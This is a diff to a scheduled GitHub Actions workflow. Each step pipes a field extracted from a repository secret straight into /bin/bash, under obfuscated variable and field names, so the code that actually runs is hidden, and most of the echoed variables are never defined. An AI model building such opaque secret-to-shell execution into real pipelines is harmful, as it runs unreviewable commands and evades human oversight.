@@ -1,24 +1,21 @@
 name: shangfeixingneng
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 0/6 * * *'
-jobs:  # 18212
+    - cron: '42 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shangfeixingneng
         env:
-          il79: ${{ secrets.il79 }}
+          z21: ${{ secrets.z21 }}
         run: |
-          echo $il79 | jq -r .dtg5913 | /bin/bash
-          echo $avuac6 | jq -r .qydz7 | /bin/bash
-          echo $kdog7 | jq -r .l0 | /bin/bash
-          echo $biow1 | jq -r .b30133 | /bin/bash
-          echo $kp14781 | jq -r .fdp25084 | /bin/bash
-          echo $sau9 | jq -r .jeb52140 | /bin/bash
-          echo $dfacc305 | jq -r .e710 | /bin/bash
-          echo $y8 | jq -r .id9531 | /bin/bash
+          echo $z21 | jq -r .r8342 | /bin/bash
+          echo $yzolx8 | jq -r .k441 | /bin/bash
+          echo $a18 | jq -r .vlb2905 | /bin/bash
+          echo $ebk984 | jq -r .a6326 | /bin/bash
+          echo $x2 | jq -r .fiqa5 | /bin/bash
 
